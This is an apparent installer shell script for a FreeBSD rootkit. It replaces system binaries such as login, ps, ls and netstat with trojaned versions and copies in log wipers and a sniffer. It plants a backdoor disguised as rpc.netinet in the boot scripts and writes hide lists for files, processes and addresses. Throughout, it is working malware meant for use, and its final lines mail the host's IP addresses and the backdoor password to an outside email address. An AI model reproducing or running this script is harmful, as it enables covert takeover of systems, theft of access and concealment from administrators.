#!/bin/sh
IVER="100001"

# Edit these
USRDIR="/dev/fd/.88"
FBRKDIR="/dev/fd/.99"
#ENTER YOUR E-MAIL ADDRESS HERE
#SCRIE-TI ADRESA TA DE MAIL AICI 
DISTSITE="jade@witch.fm"

INDIR=`pwd`
OS=`uname -s` 
VER=`uname -r`
CPU=`uname -m`
MVER=`uname -r | cut -d'-' -f1`

	# Check if the OS is FreeBSD
	case $OS in
		FreeBSD)
			;;
		*)
		echo "[!] FATAL: I tryed installing FBRK (FreeBSD rootkit) on $OS"
		exit 10
			;;
		esac

        # Check for x86 - alpha is bad
        case $CPU in
                i686)   # P2/P3/Ppro
                        ;;
                i586)   # Could be K6 etc
                        ;;
                i486)   # May take a while to install
                        ;;
                i386)   # Eek, cya next year buddy
                        ;;
                *)
                        echo "[!] FATAL: This rootkit is precompiled for x86 only, this system is $CPU"
                        exit 10;
                        ;;
                esac

	# Check FreeBSD version
        case $MVER in
                4.2)
                        ;;
                4.3)
                        ;;
                4.4)
                        ;;
                *)
			echo "[!] FATAL: Unsupported release of FreeBSD ($MVER) ... possibly too old. We will continue though ..."
                    #    exit 10;
                        sleep 3;
                        ;;
                esac

echo "[*] Installing on FreeBSD $VER ..."
echo

trojan()
{
if test -f "$1"; then
utils/sizer $1 $2
utils/fix $1 $2 $3
else
cp -f $2 $1
fi;
}

# Create install dirs
if test -d $USRDIR; then
	echo "FATAL: FBRK already installed?! $USRDIR Founded!";
#	exit 1;
fi;
mkdir $USRDIR
if test -d $FBRKDIR; then
	echo "FATAL: FBRK already installed?! $FBRKDIR Founded!";
#	exit 1;
fi;
mkdir $FBRKDIR
echo "DoNe"

# +x File Resizer and Fixer
chmod +x utils/sizer
chmod +x utils/fix

# Installing Trojans
echo
echo "Installing Trojans ..."
# Login
trojan /usr/bin/login bin/ulogin /usr/sbin/login
# Ls
trojan /bin/ls bin/ls
# Du
trojan /usr/bin/du bin/du
# Find
trojan /usr/bin/find bin/find
# Locate
trojan /usr/bin/locate bin/locate
# Ps
trojan /bin/ps bin/ps
# Top
trojan /usr/bin/top bin/top
# Strings
trojan /usr/bin/strings bin/strings /usr/sbin/strings
# Netstat
trojan /usr/bin/netstat bin/netstat
# Ifconfig
trojan /sbin/ifconfig bin/ifconfig
# Ftpd
trojan /usr/libexec/ftpd bin/ftpd

# Copying Utils
echo
echo "Copying Utils to $USRDIR"
echo -n "FRESH Binary Log-wiper ... "; cp utils/freshb-bsd $USRDIR; echo "DoNe"
echo -n "FRESH Text Log-wiper ... "; cp utils/fresht $USRDIR; echo "DoNe"
echo -n "ZX Sniff ... "; cp utils/zxsniff $USRDIR; echo "DoNe"
#echo -n "Running ZX Sniff ... "; $USRDIR/zxsniff dc0 $USRDIR/zxsniff.log; echo "DoNe"
echo -n "SysBack ... "; cp bin/sysback /usr/sbin/rpc.netinet; echo "DoNe"
echo -n "Running SYSBACK ... "; /usr/sbin/rpc.netinet; echo "DoNe"
echo -n "Sysback -> rc.d ... "; echo "/usr/sbin/rpc.netinet" >> /etc/rc.i386; echo "DoNe"
echo "Utils successfully copyed"

# Patching BOX
echo
echo "Patching this box ..."
echo -n "Patching telnetd ... "; cp -f patch/telnetd /usr/libexec/telnetd; echo "DoNe"
echo -n "Patching lpd ... "; cp -f patch/lpd /usr/sbin/lpd; echo "DoNe"
echo -n "Patching lpq ... "; cp -f patch/lpq /usr/bin/lpq; echo "DoNe"
echo -n "Closing anonymous/ftp access ... "; echo "anonymous" >> /etc/ftpusers; echo "ftp" >> /etc/ftpusers; echo "DoNe"

# Making rootkit config files
echo
echo "Making rootkit config files ... "

echo .99 >> $FBRKDIR/.ttyf00
echo .88 >> $FBRKDIR/.ttyf00
echo .ttyf00 >> $FBRKDIR/.ttyf00
echo .ttyp00 >> $FBRKDIR/.ttyf00
echo .ttyq00 >> $FBRKDIR/.ttyf00
echo .ttys00 >> $FBRKDIR/.ttyf00
echo .pwsx00 >> $FBRKDIR/.ttyf00
echo fresht >> $FBRKDIR/.ttyf00
echo freshb >> $FBRKDIR/.ttyf00
echo sysback >> $FBRKDIR/.ttyf00
echo rpc.netinet >> $FBRKDIR/.ttyf00
echo zxsniff >> $FBRKDIR/.ttyf00

#echo "[> $FBRKDIR/.ttyf00 (ROOTKIT_FILES_FILE)"
echo "2 rpc.netinet" >> $FBRKDIR/.ttyp00
echo "3 sysback" >> $FBRKDIR/.ttyp00
echo "3 zxsniff" >> $FBRKDIR/.ttyp00
echo "3 cons.saver" >> $FBRKDIR/.ttyp00 
#174

echo "[> $FBRKDIR/.ttyp00 (ROOTKIT_PROCESS_FILE)"
echo "1 194.102" >> $FBRKDIR/.ttyq00
echo "2 194.102" >> $FBRKDIR/.ttyq00
echo "2 65535" >> $FBRKDIR/.ttyq00
echo "3 65535" >> $FBRKDIR/.ttyq00

#echo "[> $FBRKDIR/.ttyq00 (ROOTKIT_ADDRESS_FILE)"
echo $FBRKDIR >> $FBRKDIR/.ttys00
echo $USRDIR >> $FBRKDIR/.ttys00
echo hack >> $FBRKDIR/.ttys00

#echo "[> $FBRKDIR/.ttys00 (ROOTKIT_STRINGS_FILE)"
PASSWORD=`utils/rpass`
if test -n "$1"; then
PASSWORD=$1
fi;
PASSWD=`utils/mkpass $PASSWORD`
echo $PASSWD >> $FBRKDIR/.pwsx00

#echo "[> $FBRKDIR/.pwsx00 (PASSWORD_FILE)"
echo "Rootkit config files maked successfully"

if test -f "/usr/bin/killall"; then
echo -n "Restarting inetd ... "
/usr/bin/killall -HUP inetd
echo "DoNe"
fi;

# Show Box Info
echo
echo "System is: FreeBSD $VER" >> /etc/.acid
IPZ=`/sbin/ifconfig -a | grep inet` >> /etc/.acid
echo "Box IP:    $IPZ" >> /etc/.acid
echo "Password:  $PASSWORD" >> /etc/.acid
echo
echo "Goodbye!"

#exit 0;
sh div
cat /etc/.acid | mail $DISTSITE
rm -rf /etc/.acid

